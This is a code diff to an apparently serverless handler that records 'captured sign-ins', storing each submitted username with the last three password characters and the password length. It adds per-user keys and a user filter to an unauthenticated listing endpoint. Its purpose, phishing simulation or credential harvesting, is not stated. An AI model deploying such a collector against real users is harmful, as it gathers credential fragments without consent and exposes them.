@@ -6,16 +6,35 @@ const json = (data, status = 200) =>
     headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
   });
 
+/* turn "Someone@Example.com" into a blob-safe, readable key prefix */
+function keyPrefix(username) {
+  return (
+    String(username)
+      .trim()
+      .toLowerCase()
+      .replace(/[^a-z0-9._+@-]/g, '_')
+      .replace(/_{2,}/g, '_')
+      .replace(/^_|_$/g, '')
+      .slice(0, 80) || 'unknown'
+  );
+}
+
 export default async (req) => {
   const store = getStore({ name: 'logins', consistency: 'strong' });
 
-  /* ---- Read every captured sign-in ---- */
+  /* ---- Read captured sign-ins (optionally filter to one user) ---- */
   if (req.method === 'GET') {
-    const { blobs } = await store.list();
+    const url = new URL(req.url);
+    const user = url.searchParams.get('user');
+
+    const { blobs } = await store.list(
+      user ? { prefix: `${keyPrefix(user)}__` } : undefined
+    );
     const records = await Promise.all(
       blobs.map((b) => store.get(b.key, { type: 'json' }).catch(() => null))
     );
     records.sort((a, b) => (b?.ts ?? 0) - (a?.ts ?? 0));
+
     return json({ count: records.length, records });
   }
 
@@ -38,6 +57,7 @@ export default async (req) => {
 
   const ts = Date.now();
   const record = {
+    step: String(body.step ?? 'signin').slice(0, 32),
     username: String(body.username ?? '').slice(0, 320),
     passwordLast3: String(body.passwordLast3 ?? '').slice(0, 3),
     passwordLength: Number.isFinite(body.passwordLength) ? body.passwordLength : null,
@@ -48,7 +68,8 @@ export default async (req) => {
     time: new Date(ts).toISOString(),
   };
 
-  const key = `${ts}-${Math.random().toString(36).slice(2, 8)}`;
+  // key reads as the user's name, e.g. someone@example.com__1760531200000-k3f9
+  const key = `${keyPrefix(record.username)}__${ts}-${Math.random().toString(36).slice(2, 6)}`;
   await store.setJSON(key, record);
 
   return json({ ok: true, key, record }, 201);
